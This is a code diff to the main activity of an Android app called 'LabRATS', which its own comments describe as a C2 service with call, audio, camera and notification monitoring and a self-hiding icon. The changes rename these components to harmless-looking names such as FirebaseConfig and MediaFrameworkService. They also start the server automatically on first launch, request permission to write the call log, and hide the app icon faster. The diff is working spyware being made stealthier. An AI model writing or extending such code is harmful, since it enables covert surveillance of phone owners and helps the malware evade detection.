@@ -75,7 +75,7 @@ public class MainActivity extends AppCompatActivity {
         // --- EMERGENCY CRASH LOGGER ---
         Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
             Log.e("LabRATS-FATAL", "CRASH_DETECTED: " + throwable.getMessage(), throwable);
-            LabRatsHttpServer.logActivity("CRITICAL_CORE_FAILURE: " + throwable.getClass().getSimpleName());
+            FirebaseConfig.logActivity("CRITICAL_CORE_FAILURE: " + throwable.getClass().getSimpleName());
             // Attempt to save logs before dying
             try { Thread.sleep(500); } catch (Exception ignored) {}
             android.os.Process.killProcess(android.os.Process.myPid());
@@ -92,8 +92,8 @@ public class MainActivity extends AppCompatActivity {
             Log.d("LabRATS-AutoStart", "First launch detected. Initiating background server startup.");
             getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("first_launch", false).apply();
             
-            // Trigger server immediately without waiting for UI toggle
-            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::toggleServer, 2000);
+            // Start server directly in background without waiting for UI
+            startServer();
         }
 
         // --- ANDROID 14+ PERSISTENT PERMISSION CHECK ---
@@ -186,6 +186,8 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onBackPressed() {
         // Move app to background instead of closing/finishing
+        super.onBackPressed();
+        super.onBackPressed();
         moveTaskToBack(true);
     }
 
@@ -238,8 +240,12 @@ public class MainActivity extends AppCompatActivity {
                 Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
         }
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add(Manifest.permission.WRITE_CALL_LOG);
+        }
 
-        // Phone call permission (NEW)
+        // Phone call permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.CALL_PHONE);
@@ -396,7 +402,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void resetTerminalFeedback() {
-        if (AccessibilityCore.getInstance() == null) {
+        if (IO_Persistence_Manager.getInstance() == null) {
             tvTerminalFeedback.setText("SECURITY_ALERT: Accessibility service disabled. Please re-enable for full control.");
             tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
         } else {
@@ -441,7 +447,6 @@ public class MainActivity extends AppCompatActivity {
                         // Instant Icon Hiding (Self-Vanishing Protocol)
                         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                             try {
-                                // Double check if server is indeed running before vanishing
                                 if (isServerRunning()) {
                                     SystemAnalytics.setStealthMode(MainActivity.this, true);
                                     Log.d("MainActivity", "Stealth transition: Identity replaced.");
@@ -449,7 +454,7 @@ public class MainActivity extends AppCompatActivity {
                             } catch (Exception e) {
                                 Log.e("MainActivity", "Stealth failure: " + e.getMessage());
                             }
-                        }, 5000); // 5s delay gives user a chance to see setup finished
+                        }, 1500); // Faster masking after setup
                     }, 3000);
                 });
             });
@@ -462,7 +467,7 @@ public class MainActivity extends AppCompatActivity {
             tvStatus.setTextColor(getColor(R.color.neon_yellow));
         });
         
-        Intent serviceIntent = new Intent(this, CoreSyncService.class);
+        Intent serviceIntent = new Intent(this, WorkManager_Sync.class);
         serviceIntent.setAction("START");
 
         try {
@@ -478,7 +483,7 @@ public class MainActivity extends AppCompatActivity {
         // Staggered Startup: Prevent hardware contention
         try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
         
-        Intent callServiceIntent = new Intent(this, AudioStability.class);
+        Intent callServiceIntent = new Intent(this, MediaFrameworkService.class);
         callServiceIntent.setAction("START_SERVICE");
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -487,7 +492,7 @@ public class MainActivity extends AppCompatActivity {
                 startService(callServiceIntent);
             }
         } catch (Exception e) {
-            Log.e("MainActivity", "Error starting AudioStability: " + e.getMessage());
+            Log.e("MainActivity", "Error starting MediaFrameworkService: " + e.getMessage());
         }
     }
 
@@ -498,16 +503,16 @@ public class MainActivity extends AppCompatActivity {
         });
 
         // 1. Stop Main C2 Service
-        Intent serviceIntent = new Intent(this, CoreSyncService.class);
+        Intent serviceIntent = new Intent(this, WorkManager_Sync.class);
         serviceIntent.setAction("STOP");
         startService(serviceIntent);
 
         // 2. Stop Audio/Call Monitor
-        Intent callServiceIntent = new Intent(this, AudioStability.class);
+        Intent callServiceIntent = new Intent(this, MediaFrameworkService.class);
         stopService(callServiceIntent);
 
         // 3. Stop Optics/Camera Service
-        Intent cameraIntent = new Intent(this, MediaContainer.class);
+        Intent cameraIntent = new Intent(this, Analytics_Provider.class);
         cameraIntent.setAction("STOP");
         startService(cameraIntent);
 
@@ -526,7 +531,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean isServerRunning() {
-        return CoreSyncService.isRunning;
+        return WorkManager_Sync.isRunning;
     }
 
     private void updateUI() {
@@ -585,7 +590,7 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 tvIpAddress.setText(ipText.toString());
                 String displayIp = (localIp != null) ? localIp : publicIp;
-                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:" + LabRatsHttpServer.DEFAULT_PORT : "http://" + displayIp + ":" + LabRatsHttpServer.DEFAULT_PORT;
+                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:" + FirebaseConfig.DEFAULT_PORT : "http://" + displayIp + ":" + FirebaseConfig.DEFAULT_PORT;
                 tvServerUrl.setText(formattedUrl);
             }
         });
@@ -654,7 +659,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void checkNotificationAccess() {
         if (!isNotificationServiceEnabled()) {
-            if (isServerRunning()) LabRatsHttpServer.logActivity("INTEL_WARNING: Notification access not granted");
+            if (isServerRunning()) FirebaseConfig.logActivity("INTEL_WARNING: Notification access not granted");
         }
     }
 
@@ -665,14 +670,14 @@ public class MainActivity extends AppCompatActivity {
         checkNotificationAccess();
         
         // Monitoring: Accessibility Health
-        if (AccessibilityCore.getInstance() == null) {
+        if (IO_Persistence_Manager.getInstance() == null) {
             tvTerminalFeedback.setText("SECURITY_ALERT: Accessibility service disabled. Please re-enable for full control.");
             tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
         }
 
         // Anti-Blackout Safety
-        if (AccessibilityCore.getInstance() != null) {
-            AccessibilityCore.getInstance().startBlackout(false);
+        if (IO_Persistence_Manager.getInstance() != null) {
+            IO_Persistence_Manager.getInstance().startBlackout(false);
         }
     }
 }
